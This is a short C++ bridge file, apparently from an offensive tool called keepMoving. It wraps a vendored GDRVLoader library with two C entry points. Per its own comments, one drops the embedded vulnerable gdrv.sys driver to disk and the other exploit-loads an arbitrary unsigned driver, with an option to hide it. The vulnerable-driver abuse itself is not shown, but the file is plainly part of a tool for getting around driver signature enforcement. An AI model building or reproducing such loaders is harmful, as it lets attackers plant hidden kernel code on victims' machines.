/*
 * C linkage bridge to the vendored GDRVLoader (third_party/gdrvloader).
 *
 * Upstream is C++ and its loader/dropper symbols are C++-mangled, so this TU
 * includes the upstream headers and re-exposes the two entry points we need
 * with extern "C" linkage.  The rest of keepMoving is plain C.
 *
 *   km_gdrv_drop_loader(path)  -> write the embedded vulnerable gdrv.sys bytes
 *   km_gdrv_load_driver(...)   -> exploit-load the target unsigned driver
 */

#include "global.h"
#include "binary/dropper.h"

extern "C" {

int km_gdrv_drop_loader(const wchar_t *path)
{
    return DropDriverFromBytes(path) ? 1 : 0;
}

long km_gdrv_load_driver(const wchar_t *loader_name,
                         const wchar_t *driver_name,
                         int hidden)
{
    return WindLoadDriver(reinterpret_cast<PWCHAR>(const_cast<wchar_t *>(loader_name)),
                          reinterpret_cast<PWCHAR>(const_cast<wchar_t *>(driver_name)),
                          static_cast<BOOLEAN>(hidden != 0));
}

}  /* extern "C" */
